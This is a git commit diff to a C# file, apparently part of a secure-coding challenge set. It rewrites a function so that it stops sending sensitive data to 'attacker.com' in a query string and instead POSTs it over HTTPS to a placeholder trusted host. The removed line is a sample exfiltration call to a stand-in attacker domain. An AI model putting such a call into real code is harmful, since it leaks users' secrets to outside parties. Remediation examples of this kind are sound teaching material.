8cccf039f768539cef1d1d1536b084513f1fb565
Kaustubh <67366443+kanyalka@users.noreply.github.com>
2024-12-05 16:17:58 +0530

    Update SendSensitiveDataToUntrustedUrl.cs

--- IndividualChallenges/SendSensitiveDataToUntrustedUrl.cs
+++ IndividualChallenges/SendSensitiveDataToUntrustedUrl.cs
@@ -1,9 +1,20 @@
-public void SendSensitiveDataToUntrustedUrl(string sensitiveData)
+public void SendSensitiveDataToTrustedUrl(string sensitiveData)
 {
-    // Insecure: Sends sensitive data to an untrusted URL
-    var request = WebRequest.Create("http://attacker.com/steal?data=" + sensitiveData);
+    // Secure: Sends sensitive data to a trusted URL using HTTPS and POST method
+    var request = WebRequest.Create("https://trusted.com/secure-endpoint");
+    request.Method = "POST";
+    request.ContentType = "application/x-www-form-urlencoded";
+
+    string postData = "data=" + Uri.EscapeDataString(sensitiveData);
+    byte[] byteArray = Encoding.UTF8.GetBytes(postData);
+
+    using (var dataStream = request.GetRequestStream())
+    {
+        dataStream.Write(byteArray, 0, byteArray.Length);
+    }
+
     using (var response = request.GetResponse())
     {
-        Console.WriteLine("Data sent to attacker: " + sensitiveData);
+        Console.WriteLine("Data sent securely.");
     }
 }
